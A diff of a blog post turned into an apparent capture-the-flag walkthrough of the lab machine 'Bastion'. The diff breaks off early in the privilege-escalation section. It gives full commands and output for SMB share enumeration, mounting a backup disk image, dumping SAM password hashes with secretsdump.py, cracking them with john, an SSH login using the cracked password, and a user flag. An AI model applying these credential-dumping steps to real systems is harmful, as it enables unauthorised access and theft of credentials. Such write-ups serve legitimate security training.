@@ -1,30 +1,430 @@
 ---
 layout: post
-title: How I Rest From Work
-date: 2017-09-12 13:32:20 +0300
+title: Bastion
+date: 20202-08-16 13:32:20 +0300
 description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
-img: i-rest.jpg # Add image post (optional)
+img:  # Add image post (optional)
 fig-caption: # Add figcaption (optional)
-tags: [Holidays, Hawaii]
----
-Fam locavore snackwave bushwick +1 sartorial. Selfies portland knausgaard synth. Pop-up art party marfa deep v pitchfork subway tile 3 wolf moon. Ennui pinterest tumblr yr, adaptogen succulents copper mug twee. Blog paleo kickstarter roof party blue bottle tattooed polaroid jean shorts man bun lo-fi health goth. Humblebrag occupy polaroid, pinterest aesthetic la croix raw denim kale chips. 3 wolf moon hella church-key XOXO, tbh locavore man braid organic gastropub typewriter. Hoodie woke tumblr dreamcatcher shoreditch XOXO jean shorts yr letterpress mlkshk paleo raw denim iceland before they sold out drinking vinegar. Banh mi aesthetic locavore normcore, gluten-free put a bird on it raclette swag jianbing pop-up echo park gentrify. Stumptown brooklyn godard tumeric ethical. Glossier freegan chicharrones subway tile authentic polaroid typewriter hot chicken. Thundercats small batch heirloom meggings.
+tags: 
+## Discover and Exploit  
 
-## Plaid ramps kitsch woke pork belly
-90's yr crucifix, selvage 8-bit listicle forage cliche shoreditch hammock microdosing synth. Farm-to-table leggings chambray iPhone, gluten-free twee synth kinfolk umami. Whatever single-origin coffee gluten-free austin everyday carry cliche cred. Plaid ramps kitsch woke pork belly organic. Trust fund whatever coloring book kombucha brooklyn. Sustainable meh vaporware cronut swag shaman lomo, mustache pitchfork selvage thundercats marfa tilde. Fashion axe hashtag skateboard, art party godard pabst bespoke synth vice YOLO master cleanse coloring book kinfolk listicle cornhole. Try-hard mixtape umami fanny pack man bun gastropub franzen tbh. Pickled narwhal health goth green juice mumblecore listicle succulents you probably haven't heard of them raw denim fashion axe shaman coloring book godard. Irony keytar drinking vinegar tilde pork belly pabst iPhone yr craft beer pok pok health goth cliche you probably haven't heard of them kombucha chicharrones. Direct trade hella roof party chia. Coloring book small batch marfa master cleanse meh kickstarter austin kale chips disrupt pork belly. XOXO tumblr migas la croix austin bushwick seitan sartorial jean shorts food truck trust fund semiotics kickstarter brooklyn sustainable. Umami knausgaard mixtape marfa. Trust fund taiyaki tacos deep v tote bag roof party af 3 wolf moon post-ironic stumptown migas.
+1. root@kali:~# nmap -A -sC -sV -p- 10.10.10.134 
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 16:29 EDT
+	Nmap scan report for 10.10.10.134
+	Host is up (0.028s latency).
+	Not shown: 65522 closed ports
+	PORT      STATE SERVICE      VERSION
+	22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+	|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+	|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+	135/tcp   open  msrpc        Microsoft Windows RPC
+	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+	445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	|_http-server-header: Microsoft-HTTPAPI/2.0
+	|_http-title: Not Found
+	47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	|_http-server-header: Microsoft-HTTPAPI/2.0
+	|_http-title: Not Found
+	49664/tcp open  msrpc        Microsoft Windows RPC
+	49665/tcp open  msrpc        Microsoft Windows RPC
+	49666/tcp open  msrpc        Microsoft Windows RPC
+	49667/tcp open  msrpc        Microsoft Windows RPC
+	49668/tcp open  msrpc        Microsoft Windows RPC
+	49669/tcp open  msrpc        Microsoft Windows RPC
+	49670/tcp open  msrpc        Microsoft Windows RPC
+	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+	TCP/IP fingerprint:
+	OS:SCAN(V=7.80%E=4%D=8/5%OT=22%CT=1%CU=40862%PV=Y%DS=2%DC=T%G=Y%TM=5F2B18E5
+	OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A                                                                                                                           
+	OS:)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54                                                                                                                           
+	OS:DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000                                                                                                                           
+	OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+                                                                                                                           
+	OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T                                                                                                                           
+	OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
+	OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
+	OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+	OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+	OS:%T=80%CD=Z)
+	
+	Network Distance: 2 hops
+	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+	
+	Host script results:
+	|_clock-skew: mean: -36m04s, deviation: 1h09m14s, median: 3m53s
+	| smb-os-discovery: 
+	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+	|   Computer name: Bastion
+	|   NetBIOS computer name: BASTION\x00
+	|   Workgroup: WORKGROUP\x00
+	|_  System time: 2020-08-05T22:42:49+02:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	| smb2-security-mode: 
+	|   2.02: 
+	|_    Message signing enabled but not required
+	| smb2-time: 
+	|   date: 2020-08-05T20:42:47
+	|_  start_date: 2020-08-05T20:22:57
+	
+	TRACEROUTE (using port 1720/tcp)
+	HOP RTT      ADDRESS
+	1   28.57 ms 10.10.14.1
+	2   28.53 ms 10.10.10.134
+	
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 599.71 seconds
+	
+2. root@kali:~/results/10.10.10.134/scans# cat smbclient.txt 
+	
+	        Sharename       Type      Comment
+	        ---------       ----      -------
+	        ADMIN$          Disk      Remote Admin
+	        Backups         Disk      
+	        C$              Disk      Default share
+	        IPC$            IPC       Remote IPC
+	SMB1 disabled -- no workgroup available
+	
+3. root@kali:~/results/10.10.10.134/scans# cat smbmap-list-contents.txt 
+	[!] Authentication error on 10.10.10.134
+	[!] RPC Authentication error occurred
+	[!] Authentication error on 10.10.10.134
+	[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
+	[|] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\PXTIOWFUHV, please remove manually
+	        Disk                                                    Permissions     Comment
+	        ----                                                    -----------     -------
+	        ADMIN$                                                  NO ACCESS       Remote Admin
+	        Backups                                                 READ, WRITE
+	        .\Backups\*
+	        dr--r--r--                0 Wed Aug  5 16:32:56 2020    .
+	        dr--r--r--                0 Wed Aug  5 16:32:56 2020    ..
+	        dr--r--r--                0 Wed Aug  5 16:32:49 2020    GDVEJRLCBU
+	        fw--w--w--              116 Tue Apr 16 07:43:19 2019    note.txt
+	        dr--r--r--                0 Wed Aug  5 16:32:56 2020    PXTIOWFUHV
+	        fr--r--r--                0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
+	        dr--r--r--                0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
+	        .\Backups\WindowsImageBackup\*
+	        dr--r--r--                0 Fri Feb 22 07:44:02 2019    .
+	        dr--r--r--                0 Fri Feb 22 07:44:02 2019    ..
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    L4mpje-PC
+	        .\Backups\WindowsImageBackup\L4mpje-PC\*
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    .
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    ..
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    Backup 2019-02-22 124351
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    Catalog
+	        fr--r--r--               16 Fri Feb 22 07:44:02 2019    MediaId
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    SPPMetadataCache
+	        .\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\*
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    .
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    ..
+	        fr--r--r--         37761024 Fri Feb 22 07:44:03 2019    9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+	        fr--r--r--       5418299392 Fri Feb 22 07:45:32 2019    9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+	        fr--r--r--             1186 Fri Feb 22 07:45:32 2019    BackupSpecs.xml
+	        fr--r--r--             1078 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+	        fr--r--r--             8930 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+	        fr--r--r--             6542 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+	        fr--r--r--             2894 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+	        fr--r--r--             1488 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+	        fr--r--r--             1484 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+	        fr--r--r--             3844 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+	        fr--r--r--             3988 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+	        fr--r--r--             7110 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+	        fr--r--r--          2374620 Fri Feb 22 07:45:32 2019    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+	        .\Backups\WindowsImageBackup\L4mpje-PC\Catalog\*
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    .
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    ..
+	        fr--r--r--             5698 Fri Feb 22 07:45:32 2019    BackupGlobalCatalog
+	        fr--r--r--             7440 Fri Feb 22 07:45:32 2019    GlobalCatalog
+	        .\Backups\WindowsImageBackup\L4mpje-PC\SPPMetadataCache\*
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    .
+	        dr--r--r--                0 Fri Feb 22 07:45:32 2019    ..
+	        fr--r--r--            57848 Fri Feb 22 07:45:32 2019    {cd113385-65ff-4ea2-8ced-5630f6feca8f}
+	        C$                                                      NO ACCESS       Default share
+	        IPC$                                                    READ ONLY       Remote IPC
+	        .\IPC$\*
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
+	        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2dc-0
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1cc-0
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-368-0
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-358-0
+	        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-600-0
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-594-0
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    openssh-ssh-agent
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
+	        fr--r--r--                5 Sun Dec 31 19:03:58 1600    srvsvc
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-248-0
+	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-250-0
+	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    winreg
+	[!] RPC Authentication error occurred
+	[!] Authentication error on 10.10.10.134
+	
+4. root@kali:/tmp/bastio# smbclient \\\\10.10.10.134\\Backups -N
+	Try "help" to get a list of possible commands.
+	smb: \> ls
+	  .                                   D        0  Wed Aug  5 16:33:47 2020
+	  ..                                  D        0  Wed Aug  5 16:33:47 2020
+	  GDVEJRLCBU                          D        0  Wed Aug  5 16:32:49 2020
+	  nmap-test-file                      A      260  Wed Aug  5 16:33:47 2020
+	  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
+	  PXTIOWFUHV                          D        0  Wed Aug  5 16:32:56 2020
+	  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
+	  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019
+	                                                                                                                                                                                                      
+	                7735807 blocks of size 4096. 2759362 blocks available                                                                                                                                 
+	smb: \> get note.txt                                                                                                                                                                                  
+	getting file \note.txt of size 116 as note.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)  
+	
+5. root@kali:/tmp/bastio# cat note.txt 
+	
+	 Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+	
+	
+	Instead of downloading, we can mount the shared files locally.  Check the below link for more info :
+	https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
+	
+	
+	
+6. root@kali:/mnt/bas# mount -t cifs  //10.10.10.134/Backups/ /tmp/bastio/mnt/
+	Password for root@//10.10.10.134/Backups/:  
+	root@kali:/mnt/bas# cd /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/
+	root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC# ls -la
+	total 8
+	drwxr-xr-x 2 root root 4096 Feb 22  2019  .
+	drwxr-xr-x 2 root root    0 Feb 22  2019  ..
+	drwxr-xr-x 2 root root    0 Feb 22  2019 'Backup 2019-02-22 124351'
+	drwxr-xr-x 2 root root    0 Feb 22  2019  Catalog
+	-rwxr-xr-x 1 root root   16 Feb 22  2019  MediaId
+	drwxr-xr-x 2 root root    0 Feb 22  2019  SPPMetadataCache
+	root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC# cd 'Backup 2019-02-22 124351'/
+	root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# ls
+	9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+	9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+	BackupSpecs.xml                                                                               cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+	cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+	cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                           cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+	cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                     cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+	
+	To mount vhd file we use the tool guestmount, we need to install libguestfs-tools for this
+	
+7. root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# guestmount --add /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\       124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /tmp/bastio/empty/
 
-![I and My friends]({{site.baseurl}}/assets/img/we-in-rest.jpg)
+8. root@kali:/tmp/bastio/empty# ls -la
+	total 2096745
+	drwxrwxrwx 1 root root      12288 Feb 22  2019  .
+	drwxr-xr-x 4 root root       4096 Aug  8 11:52  ..
+	drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
+	-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
+	-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
+	lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
+	-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
+	drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
+	drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
+	drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
+	drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
+	drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
+	drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
+	drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
+	
+9. root@kali:/tmp/bastio/empty/Users# ls
+	'All Users'   Default  'Default User'   desktop.ini   L4mpje   Public
+	
+10. root@kali:/tmp/bastio/empty/Windows/System32/config£ ls -la
+	total 74740
+	drwxrwxrwx 1 root root    12288 Feb 22  2019 .
+	drwxrwxrwx 1 root root   655360 Feb 22  2019 ..
+	-rwxrwxrwx 2 root root    28672 Feb 22  2019 BCD-Template
+	-rwxrwxrwx 2 root root    25600 Feb 22  2019 BCD-Template.LOG
+	-rwxrwxrwx 2 root root 30932992 Feb 22  2019 COMPONENTS
+	-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.0.regtrans-ms
+	-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.1.regtrans-ms
+	-rwxrwxrwx 2 root root  1048576 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.2.regtrans-ms
+	-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ec-6e01-11de-8bed-001e0bcd1824}.TxR.blf
+	-rwxrwxrwx 2 root root    65536 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TM.blf
+	-rwxrwxrwx 2 root root   524288 Feb 22  2019 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms
+	-rwxrwxrwx 2 root root   524288 Jul 14  2009 COMPONENTS{6cced2ed-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms
+	-rwxrwxrwx 2 root root     1024 Apr 11  2011 COMPONENTS.LOG
+	-rwxrwxrwx 2 root root   262144 Feb 22  2019 COMPONENTS.LOG1
+	-rwxrwxrwx 2 root root        0 Jul 13  2009 COMPONENTS.LOG2
+	-rwxrwxrwx 1 root root   262144 Feb 22  2019 DEFAULT
+	-rwxrwxrwx 1 root root     1024 Apr 11  2011 DEFAULT.LOG
+	-rwxrwxrwx 2 root root    91136 Feb 22  2019 DEFAULT.LOG1
+	-rwxrwxrwx 2 root root        0 Jul 13  2009 DEFAULT.LOG2
+	drwxrwxrwx 1 root root        0 Jul 13  2009 Journal
+	drwxrwxrwx 1 root root        0 Feb 22  2019 RegBack
+	-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
+	-rwxrwxrwx 1 root root     1024 Apr 11  2011 SAM.LOG
+	-rwxrwxrwx 2 root root    21504 Feb 22  2019 SAM.LOG1
+	-rwxrwxrwx 2 root root        0 Jul 13  2009 SAM.LOG2
+	-rwxrwxrwx 1 root root   262144 Feb 22  2019 SECURITY
+	-rwxrwxrwx 1 root root     1024 Apr 11  2011 SECURITY.LOG
+	-rwxrwxrwx 2 root root    21504 Feb 22  2019 SECURITY.LOG1
+	-rwxrwxrwx 2 root root        0 Jul 13  2009 SECURITY.LOG2
+	-rwxrwxrwx 1 root root 24117248 Feb 22  2019 SOFTWARE
+	-rwxrwxrwx 1 root root     1024 Apr 11  2011 SOFTWARE.LOG
+	-rwxrwxrwx 2 root root   262144 Feb 22  2019 SOFTWARE.LOG1
+	-rwxrwxrwx 2 root root        0 Jul 13  2009 SOFTWARE.LOG2
+	-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
+	-rwxrwxrwx 1 root root     1024 Apr 11  2011 SYSTEM.LOG
+	-rwxrwxrwx 2 root root   262144 Feb 22  2019 SYSTEM.LOG1
+	-rwxrwxrwx 2 root root        0 Jul 13  2009 SYSTEM.LOG2
+	drwxrwxrwx 1 root root     4096 Nov 20  2010 systemprofile
+	drwxrwxrwx 1 root root     4096 Feb 22  2019 TxR
+	
+	
+	To extract Password hash we use secretsdump.py
+	 https://www.hackingarticles.in/credential-dumping-sam/
+	
+	
+11. root@kali:/tmp/bastio/empty/Windows/System32/config£ secretsdump.py -sam SAM -system SYSTEM LOCAL
+	Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+	
+	[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
+	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+	[*] Cleaning up... 
+	
+12. root@kali:/tmp/bastio# john --format=NT /tmp/bastio/hash --wordlist=/usr/share/wordlists/rockyou.txt
+	Using default input encoding: UTF-8
+	Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
+	No password hashes left to crack (see FAQ)
+	
+	1 password hash cracked, 0 left
+	
+13. root@kali:/tmp/bastio# john --format=NT /tmp/bastio/hash --show
+	Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 
-Selfies sriracha taiyaki woke squid synth intelligentsia PBR&B ethical kickstarter art party neutra biodiesel scenester. Health goth kogi VHS fashion axe glossier disrupt, vegan quinoa. Literally umami gochujang, mustache bespoke normcore next level fanny pack deep v tumeric. Shaman vegan affogato chambray. Selvage church-key listicle yr next level neutra cronut celiac adaptogen you probably haven't heard of them kitsch tote bag pork belly aesthetic. Succulents wolf stumptown art party poutine. Cloud bread put a bird on it tacos mixtape four dollar toast, gochujang celiac typewriter. Cronut taiyaki echo park, occupy hashtag hoodie dreamcatcher church-key +1 man braid affogato drinking vinegar sriracha fixie tattooed. Celiac heirloom gentrify adaptogen viral, vinyl cornhole wayfarers messenger bag echo park XOXO farm-to-table palo santo.
+14. root@kali:/tmp/bastio/empty/Windows/System32/config£ ssh L4mpje@10.10.10.134
+	L4mpje@10.10.10.134's password: 
+	Microsoft Windows [Version 10.0.14393]                                                                                          
+	(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+	
+	l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                           
+	bastion\l4mpje        
+	
+	User.txt : 9bfe57d5c3309db3a151772f9d86c6cd
 
->Hexagon shoreditch beard, man braid blue bottle green juice thundercats viral migas next level ugh. Artisan glossier yuccie, direct trade photo booth pabst pop-up pug schlitz.
 
-Cronut lumbersexual fingerstache asymmetrical, single-origin coffee roof party unicorn. Intelligentsia narwhal austin, man bun cloud bread asymmetrical fam disrupt taxidermy brunch. Gentrify fam DIY pabst skateboard kale chips intelligentsia fingerstache taxidermy scenester green juice live-edge waistcoat. XOXO kale chips farm-to-table, flexitarian narwhal keytar man bun snackwave banh mi. Semiotics pickled taiyaki cliche cold-pressed. Venmo cardigan thundercats, wolf organic next level small batch hot chicken prism fixie banh mi blog godard single-origin coffee. Hella whatever organic schlitz tumeric dreamcatcher wolf readymade kinfolk salvia crucifix brunch iceland. Literally meditation four loko trust fund. Church-key tousled cred, shaman af edison bulb banjo everyday carry air plant beard pinterest iceland polaroid. Skateboard la croix asymmetrical, small batch succulents food truck swag trust fund tattooed. Retro hashtag subway tile, crucifix jean shorts +1 pitchfork gluten-free chillwave. Artisan roof party cronut, YOLO art party gentrify actually next level poutine. Microdosing hoodie woke, bespoke asymmetrical palo santo direct trade venmo narwhal cornhole umami flannel vaporware offal poke.
 
-* Hexagon shoreditch beard
-* Intelligentsia narwhal austin
-* Literally meditation four
-* Microdosing hoodie woke
-
-Wayfarers lyft DIY sriracha succulents twee adaptogen crucifix gastropub actually hexagon raclette franzen polaroid la croix. Selfies fixie whatever asymmetrical everyday carry 90's stumptown pitchfork farm-to-table kickstarter. Copper mug tbh ethical try-hard deep v typewriter VHS cornhole unicorn XOXO asymmetrical pinterest raw denim. Skateboard small batch man bun polaroid neutra. Umami 8-bit poke small batch bushwick artisan echo park live-edge kinfolk marfa. Kale chips raw denim cardigan twee marfa, mlkshk master cleanse selfies. Franzen portland schlitz chartreuse, readymade flannel blog cornhole. Food truck tacos snackwave umami raw denim skateboard stumptown YOLO waistcoat fixie flexitarian shaman enamel pin bitters. Pitchfork paleo distillery intelligentsia blue bottle hella selfies gentrify offal williamsburg snackwave yr. Before they sold out meggings scenester readymade hoodie, affogato viral cloud bread vinyl. Thundercats man bun sriracha, neutra swag knausgaard jean shorts. Tattooed jianbing polaroid listicle prism cloud bread migas flannel microdosing williamsburg.
-
-Echo park try-hard irony tbh vegan pok pok. Lumbersexual pickled umami readymade, blog tote bag swag mustache vinyl franzen scenester schlitz. Venmo scenester affogato semiotics poutine put a bird on it synth whatever hell of coloring book poke mumblecore 3 wolf moon shoreditch. Echo park poke typewriter photo booth ramps, prism 8-bit flannel roof party four dollar toast vegan blue bottle lomo. Vexillologist PBR&B post-ironic wolf artisan semiotics craft beer selfies. Brooklyn waistcoat franzen, shabby chic tumeric humblebrag next level woke. Viral literally hot chicken, blog banh mi venmo heirloom selvage craft beer single-origin coffee. Synth locavore freegan flannel dreamcatcher, vinyl 8-bit adaptogen shaman. Gluten-free tumeric pok pok mustache beard bitters, ennui 8-bit enamel pin shoreditch kale chips cold-pressed aesthetic. Photo booth paleo migas yuccie next level tumeric iPhone master cleanse chartreuse ennui.
+## Privilege Escalation
+12. l4mpje@BASTION C:\>whoami /priv                                                                                                                                                                       
+	                                                                                                                                                                                                      
+	PRIVILEGES INFORMATION                                                                                                                                                                                
+	----------------------                                                                                                                                                                                
+	                                                                                                                                                                                                      
+	Privilege Name                Description                    State                                                                                                                                    
+	============================= ============================== =======                                                                                                                                  
+	SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                                  
+	SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+	
+	Noticed that we have mRemoteNG , which stores encrypted password in a XML file
+	http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html
+	       
+	
+13. l4mpje@BASTION C:\Program Files (x86)>dir                                                                                                                                                             
+	 Volume in drive C has no label.                                                                                                                                                                      
